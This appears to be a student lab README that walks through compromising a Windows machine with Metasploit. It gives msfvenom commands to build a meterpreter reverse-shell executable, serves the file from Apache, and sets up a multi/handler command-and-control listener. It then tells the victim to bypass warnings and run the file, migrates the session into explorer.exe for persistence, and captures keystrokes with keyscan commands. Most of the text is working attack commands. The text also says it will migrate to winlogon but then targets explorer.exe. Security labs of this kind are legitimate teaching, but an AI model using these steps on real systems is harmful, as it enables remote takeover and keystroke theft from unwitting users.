# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![Screenshot 2024-04-28 123448](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/34da429d-b431-45b2-ae30-aa1924e17658)




Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT
![Screenshot 2024-04-28 123609](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/2e10d3b3-4532-481d-89ff-12681cf20564)




copy the fun.exe into the apache /var/www/html folder

![Screenshot 2024-04-28 123754](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/d6671bdd-b44a-4b82-885b-965002153221)


Start apache server
sudo systemctl apache2 start

![Screenshot 2024-04-28 123804](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/49eba652-4a20-4165-8d75-dc17895b278d)



Check the status of apache2
![Screenshot 2024-04-28 123821](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/7cdb2bba-436d-4b1f-8852-270d162e9239)



Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT:

![Screenshot 2024-04-28 124530](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/19c78589-b97d-43da-b435-1df8509f757a)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/f351bc12-86c4-43ba-aa28-244eae2c9b27)



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/8c859978-ca53-4c49-9a21-c91dff67a007)




## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/326531ef-2adb-43a6-bd9d-a99470c40392)




keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/5e944e00-6fab-45ce-951e-ff11a000f3fe)





## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
